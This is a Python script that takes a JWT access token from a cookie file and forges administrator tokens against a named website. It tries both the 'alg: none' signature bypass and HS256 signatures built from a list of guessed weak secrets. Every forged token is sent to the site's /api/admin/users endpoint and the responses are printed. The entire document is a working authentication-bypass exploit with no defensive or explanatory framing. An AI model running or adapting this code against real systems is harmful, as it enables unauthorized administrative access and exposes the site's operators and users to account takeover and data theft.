import base64, json, hmac, hashlib, sys, urllib.request, urllib.error

def b64u(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def b64d(s):
    return base64.urlsafe_b64decode(s + '=' * (-len(s) % 4))

def get_token(cookie_file):
    with open(cookie_file) as f:
        for line in f:
            parts = line.strip().split('\t')
            if len(parts) >= 7 and parts[5] == 'access_token_cookie':
                return parts[6]
    return None

def test_token(tok, path):
    req = urllib.request.Request("https://thedownundernews.online" + path,
                                 headers={"Cookie": "access_token_cookie=" + tok})
    try:
        r = urllib.request.urlopen(req, timeout=15)
        return r.status, r.read(300).decode(errors='replace')
    except urllib.error.HTTPError as e:
        return e.code, e.read(300).decode(errors='replace')

token = get_token(sys.argv[1])
if not token:
    print("NO TOKEN FOUND")
    sys.exit(1)
h, p, s = token.split('.')
hdr = json.loads(b64d(h).decode())
pay = json.loads(b64d(p).decode())
print("ORIGINAL_HEADER:", hdr)
print("ORIGINAL_PAYLOAD:", pay)

def make_none(payload_obj):
    h2 = b64u(json.dumps({"alg": "none", "typ": "JWT"}).encode())
    p2 = b64u(json.dumps(payload_obj).encode())
    return h2 + "." + p2 + "."

def make_hs(payload_obj, secret):
    h2 = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
    p2 = b64u(json.dumps(payload_obj).encode())
    sig = hmac.new(secret.encode(), (h2 + "." + p2).encode(), hashlib.sha256).digest()
    return h2 + "." + p2 + "." + b64u(sig)

results = []
# alg=none forged as admin (sub=1)
for sub in ["1", "2"]:
    po = dict(pay); po["sub"] = sub
    st, body = test_token(make_none(po), "/api/admin/users")
    results.append(("ALG_NONE_sub=" + sub, st, body[:80]))

# weak secrets HS256 forged as admin (sub=1)
secrets = ["secret", "changeme", "password", "admin", "secretkey", "jwtsecret",
           "flask", "dev", "123456", "the-down-under-news", "thedownundernews",
           "downunder", "key", "supersecret", "testing"]
for sec in secrets:
    po = dict(pay); po["sub"] = "1"
    st, body = test_token(make_hs(po, sec), "/api/admin/users")
    results.append(("WEAK_SECRET_" + sec, st, body[:60]))

for name, st, body in results:
    print(f"{name} -> {st} | {body}")

print("DONE")
